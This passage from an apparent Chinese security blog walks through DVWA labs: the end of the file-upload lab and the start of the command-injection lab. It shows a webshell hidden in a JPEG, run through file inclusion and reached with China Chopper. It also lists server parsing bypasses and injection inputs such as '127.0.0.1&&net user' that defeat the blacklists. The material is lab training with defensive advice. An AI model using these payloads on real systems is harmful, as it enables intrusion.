uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>strrpos(string,find,start)</strong> 函数：<strong>返回字符串 find 在另一字符串 string  中最后一次出现的位置，如果没有找到字符串则返回 false</strong>，可选参数 start 规定在何处开始搜索。</p><p><strong>getimagesize(string  filename)</strong>  函数：<strong>会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头则报错。</strong>源码通过字符串匹配来确定文件后缀名，并且查看文件的相关参数，提高了过滤的强度。</p><h3 id="漏洞测试-2"><a href="#漏洞测试-2" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>由于源码会去检查文件头，现在我们不能再传 php 文件了，应该把一句话木马包在一张图片里面。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120114719012.png" alt="image-20220120114719012"></p><p>首先我们要准备一张图片和一句话木马，然后使用 copy 命令把两个文件合成为一个文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy saber.jpg/b + mikasu.php/a  muma.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120114836232.png" alt="image-20220120114836232"></p><p>然后直接上传，网页提示上传成功。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120120311978.png" alt="image-20220120120311978"></p><p>访问地址进行查看</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120120325929.png" alt="image-20220120120325929"></p><p>成功上传，但是被解析为图片</p><p>所以此时是不能用菜刀连接的，因为菜刀的原理是向上传文件发送包含参数的 post 请求，通过控制参数来执行不同的命令。这里服务器将木马文件解析成了图片文件，因此向其发送 post 请求时，服务器并不会执行相应命令。</p><p>因此我们要把这张图片当做 php 来执行才行，这时我们想到了 File Inclusion(文件包含) 漏洞，构造 payload。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///D:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\muma.jpg</span><br></pre></td></tr></table></figure><p>访问下看看，可以看到这个 url 使得一句话木马被解析</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120121302209.png" alt="image-20220120121302209"></p><p>也就是说这个时候就可以使用菜刀连接，添加shell连接。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120121451472.png" alt="image-20220120121451472"></p><p>连接成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120121528656.png" alt="image-20220120121528656"></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>难度调整为impossible</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120122235244.png" alt="image-20220120122235244"></p><p>到目前为止，源码将检查所有级别的所有内容。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Impossible 级别的代码<strong>对上传文件进行了重命名</strong>，并<strong>加入 Anti-CSRF token 防护 CSRF 攻击</strong>，同时使用<strong>上述所有机制对文件的内容</strong>，导致攻击者无法上传木马文件。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="补充：常见的文件解析漏洞："><a href="#补充：常见的文件解析漏洞：" class="headerlink" title="补充：常见的文件解析漏洞："></a>补充：常见的文件解析漏洞：</h2><h3 id="1-IIS-解析漏洞"><a href="#1-IIS-解析漏洞" class="headerlink" title="1.IIS 解析漏洞"></a>1.IIS 解析漏洞</h3><p>IIS6.0 在解析文件时存在以下两个解析漏洞 .</p><blockquote><p>当建立 .asa 、.asp 格式的文件夹时 , 其目录下的任意文件都将被 IIS 当作 asp 文件 来解析 .</p><p>在 IIS6.0 下 , 分 号 后面 的 扩 展 名 不 会 被 解 析 , 也 就 是 说 当 文 件 为 *.asp;.jpg时,IIS6.0 同样会以 ASP脚本来执行 .</p></blockquote><h3 id="2-Apache-解析漏洞"><a href="#2-Apache-解析漏洞" class="headerlink" title="2.Apache 解析漏洞"></a>2.Apache 解析漏洞</h3><blockquote><p>在 Apache 1.x 和 Apache 2.x 中存在解析漏洞 , 但他们与 IIS 解析漏洞不同 .</p><p>Apache 在解析文件时有一个规则 : 当碰到不认识的扩展名时 , 将会从后向前解析 , 直到 碰到认识的扩展名位置 , 如果都不认识 , 则会暴露其源码 。比如：1.php.rar.xx.aa</p><p>Apache 首先会解析 aa 扩展名 , 如果不认识则接着解析 xx 扩展名 , 这样一直遍历到认识 的扩展名为止 , 然后再将其进行解析</p></blockquote><h3 id="3-PHP-CGI-解析漏洞"><a href="#3-PHP-CGI-解析漏洞" class="headerlink" title="3.PHP CGI 解析漏洞"></a>3.PHP CGI 解析漏洞</h3><p>在 PHP的配置文件中有一个关键的选项 : cgi.fi: x_pathinfo. 这个选项在某些版本是</p><p>默认开启的 , 在开启时访问 url, 比如： <a href="http://www.xxx.com/x.txt/x.php,x.php">http://www.xxx.com/x.txt/x.php,x.php</a> 是不存在的 文件 , 所以  php 将会向前递归解析 , 于是就造成了解析漏洞 . 由于这种漏洞常见于 IIS7.0 、 IIS7.5 、 Nginx 等 Web服务器 , 所以经常会被误认为是这些 Web服务器的解析漏洞 .</p><h3 id="4-Nginx-lt-8-03-空字节代码执行漏洞"><a href="#4-Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="4.Nginx &lt;8.03 空字节代码执行漏洞"></a>4.Nginx &lt;8.03 空字节代码执行漏洞</h3><p>影响版本 :0.5,0.6,0.7&lt;=0.7.65 0.8&lt;=0.8.37</p><p>Nginx 在图片中嵌入 PHP代码 , 然后通过访问 xxx.jpg%00.php 可以执行其中的代码 .</p><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h3><p>在 windows 环境下， xx.jpg[ 空格 ] 或 xx.jpg. 这两类文件都是不允许存在的 , 若这样命 名,windows  会默认除去空格或点 , 攻击者可以通过抓包 , 在文件名后加一个空格或者点绕过 黑名单 . 若上传成功 , 空格和点都会被 windows  自动消除 , 这样也可以 getshell.</p><p>如果在 Apache 中 .htaccess 可被执行 . 且可被上传 . 那可以尝试在 .htaccess 中写入 :</p><p> SetHandlerapplication/x-httpd-php</p><p> 然后再上传名称为 shell.jpg 的 webshell, 这样 shell.jpg 就可解析为 php 文件 .</p><h2 id="File-Upload防护总结："><a href="#File-Upload防护总结：" class="headerlink" title="File Upload防护总结："></a><strong>File Upload防护总结：</strong></h2><blockquote><p>1.检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )</p><p>2.文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 )</p><p>3.文件 MIME验证 ( 比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 )</p><p>4.文件内容检测 ( 避免图片中插入 webshell)</p><p>5.图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )</p><p>6.文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )</p></blockquote><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>另外值得注意的一点是, 攻击者<strong>上传了webshell之后需要得到webshell 的路径</strong>才能通过工具连接 webshell, 所以<strong>尽量不要在任何地方 (  如下载链接等 ) 暴露文件上传后的地址。</strong></p><p>在这里必须要提一点 , 就是有<strong>很多网站的上传点在上传了文件之后不会在网页上或下载链接中暴露文件的相对路径, 但是在服务器返回的数据包里却带有文件上传后的路径。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行（Command injection）</title>
      <link href="/2022/01/19/CTF/Web/dvwa/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88Command%20injection%EF%BC%89/"/>
      <url>/2022/01/19/CTF/Web/dvwa/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88Command%20injection%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行（Command-injection）"><a href="#命令执行（Command-injection）" class="headerlink" title="命令执行（Command injection）"></a>命令执行（Command injection）</h1><h2 id="命令执行介绍"><a href="#命令执行介绍" class="headerlink" title="命令执行介绍"></a>命令执行介绍</h2><p>命令注入攻击，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。</p><p>在命令注入的漏洞中，<strong>最为常见的是PHP的命令注入</strong>。</p><p>由于开发人员在编写源代码时，没有对源代码中可执行的特殊函数入口做过滤，导致客户端可以提交一些cmd命令，并交由服务器程序执行。导致攻击者可以通过浏览器或者其他客户端软件提交一些cmd命令（或者bash命令）至服务器程序，服务器程序通过system、eval、exec等函数直接或者间接地调用cmd.exe执行攻击者提交的命令。</p><p>PHP命令注入<strong>攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。</strong></p><p>例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施下一步渗透攻击。</p><h2 id="常用的命令连接符"><a href="#常用的命令连接符" class="headerlink" title="常用的命令连接符"></a>常用的命令连接符</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp; : 顺序执行命令</span><br><span class="line">&amp;&amp; : 当前面的命令执行成功时,运行后面的命令</span><br><span class="line">| : 管道符 , 将前一条命令的标准输出作为后一条命令的标准输入</span><br><span class="line">|| : 当前面的命令执行失败时,运行后面的命令</span><br></pre></td></tr></table></figure><p>如果程序没有进行过滤，那么我们就可以通过连接符执行多条系统命令。</p><h2 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>() — 执行一个外部程序</span><br><span class="line"><span class="comment">#exec 不会主动返回执行结果,且只是返回结果的最后一行;</span></span><br><span class="line">passthru() — 执行外部程序并且显示原始输出</span><br><span class="line"><span class="comment">#passthru()用来执行外部命令,但直接将结果输出到浏览器(未经任何处理的 原始输出),没有返回值;</span></span><br><span class="line">system() — 执行外部程序，并且显示输出</span><br><span class="line"><span class="comment">#system()成功则返回命令输出的最后一行，失败则返回 FALSE;</span></span><br><span class="line">shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line"><span class="comment">#当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 NULL</span></span><br><span class="line"><span class="built_in">eval</span>()：将输入的字符串参数当做PHP程序代码来执行</span><br></pre></td></tr></table></figure><p>具体可以参考<a href="https://www.php.cn/php-weizijiaocheng-407459.html">php中文网</a></p><h2 id="windows-net命令"><a href="#windows-net命令" class="headerlink" title="windows net命令"></a>windows net命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Net ViewI</span><br><span class="line">作用：显示域列表、计算机列表或指定计算机的共享资源列表。</span><br><span class="line">Net User</span><br><span class="line">作用：添加或更改用户帐号或显示用户帐号信息。</span><br><span class="line">Net Use</span><br><span class="line">作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。</span><br><span class="line">Net Time</span><br><span class="line">作用：使计算机的时钟与另一台计算机或域的时间同步。</span><br><span class="line">Net Config</span><br><span class="line">作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。</span><br></pre></td></tr></table></figure><p>具体可以参考大师傅的博客<a href="https://www.cnblogs.com/YangJieCheng/p/8176358.html">CMD-NET命令详解</a>这个漏洞是真的恐怖，可以任意修改你的计算机里的内容。</p><p>在了解了基础的知识后，下面就通过DVWA来练习一下<strong>Command Execution</strong>.</p><h1 id="DVWA—Command-Injection"><a href="#DVWA—Command-Injection" class="headerlink" title="DVWA—Command Injection"></a>DVWA—Command Injection</h1><p>在此之前先来<strong>解决乱码</strong>的问题</p><p>在<code>DVWA\dvwa\includes</code>目录下找到<code>dvwaPage.inc.php</code>文件中所有的”<code>charset=utf-8</code>”，修改”<code>charset=gb2312</code>”，即可解决乱码问题。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119213320134.png" alt="image-20220119213320134"></p><p>进入Command injection，查看是否修改成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119214007662.png"></p><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>选择low级别</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119221124286.png" alt="image-20220119221124286"></p><h3 id="观察源码"><a href="#观察源码" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stristr() 函数搜索字符串在另一字符串中的第一次出现，不区分大小写</span><br><span class="line">php_uname() 返回了运行 PHP 的操作系统的描述。</span><br><span class="line">参数：</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>：此为默认。</span><br><span class="line"><span class="string">&#x27;s&#x27;</span>：操作系统名称。</span><br><span class="line"><span class="string">&#x27;n&#x27;</span>：主机名。</span><br><span class="line"><span class="string">&#x27;r&#x27;</span>：版本名称。</span><br><span class="line"><span class="string">&#x27;v&#x27;</span>：版本信息。</span><br><span class="line"><span class="string">&#x27;m&#x27;</span>：机器类型。</span><br></pre></td></tr></table></figure><p>通过源码可以看出，源码只是针对不同的操作系统执行不同的<code>ping命令</code>而已，没有对<code>ip参数</code>并未做任何的过滤，因此存在命令注入漏洞。</p><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;echo &quot;Hello&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119221938298.png" alt="image-20220119221938298"></p><p>回显结果执行了我输入的<code>echo &quot;Hello&quot;</code>命令</p><p>接下来输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;net user</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119222045981.png" alt="image-20220119222045981"></p><p>命令执行成功，但这个漏洞是真的恐怖，如果攻击者利用这个漏洞修改电脑用户、更改系统配置。。。，可见危害之大。</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>调整难度为medium</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119222136170.png" alt="image-20220119222136170"></p><h3 id="观察源码-1"><a href="#观察源码-1" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>发现这段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line">#array_keys() 函数返回包含数组中所有键名的一个新数组。</span><br></pre></td></tr></table></figure><p>过滤了<code>&amp;&amp;</code>、<code>；</code>，但是没有过滤掉<code>&amp;</code>、<code>|</code>,所以依旧有漏洞存在</p><h3 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | net user</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119222334990.png" alt="image-20220119222334990"></p><p>也可以输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp; net user</span><br></pre></td></tr></table></figure><p>一样会执行成功</p><p>除此之外，也可以采用拼接的方法进行绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;;&amp;net user</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119222455443.png" alt="image-20220119222455443"></p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>调整难度为high</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119222842433.png" alt="image-20220119222842433"></p><h3 id="观察源码-2"><a href="#观察源码-2" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span 